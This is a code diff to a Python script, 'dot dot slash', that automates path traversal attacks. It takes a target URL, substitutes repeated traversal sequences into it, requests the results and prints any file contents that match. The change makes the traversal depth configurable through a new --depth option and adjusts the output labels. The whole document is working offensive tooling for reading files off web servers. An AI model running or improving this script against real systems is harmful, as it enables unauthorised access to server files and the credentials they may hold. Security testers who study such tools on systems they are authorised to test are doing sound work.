@@ -22,6 +22,7 @@ parser = argparse.ArgumentParser(description = 'dot dot slash - A automated Path
 parser.add_argument('--url', action = 'store', dest = 'url', required = True, help = 'Url to attack.')
 parser.add_argument('--string', action = 'store', dest = 'string', required = True, help = 'String in --url to attack. Ex: document.pdf')
 parser.add_argument('--cookie', action = 'store', dest = 'cookie', required = False, help = 'Document cookie.')
+parser.add_argument('--depth', action = 'store', dest = 'depth', required = False, type = int, default = '6', help = 'How deep we will go?')
 arguments = parser.parse_args()
 
 
@@ -54,7 +55,7 @@ class bcolors:
 
 def forloop():	
 	count = 0
-	while (count != 5):
+	while (count != arguments.depth):
 		for var in dotvar:
 			for word in match.keys():
 				rewrite = (var * count) + word
@@ -63,11 +64,13 @@ def forloop():
 				if (arguments.cookie):
 					req.add_header("Cookie", arguments.cookie)
 				resp = request.urlopen(req)
+				
 				catchdata = re.findall(str(match[word]), resp.read().decode())
 				if (len(catchdata) != 0):
 					print(bcolors.OKGREEN + "\n[" + str(resp.code) + "] " + bcolors.ENDC + fullrewrite)
-					print(" Strings Found: " + str(len(catchdata)))
+					print(" Content Found: " + str(len(catchdata)))
 				icount = 0
+				# Print match
 				for i in catchdata:
 					print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
 					icount = icount + 1
@@ -77,7 +80,3 @@ def forloop():
 		count = count + 1
 
 forloop()
-
-	
-
-
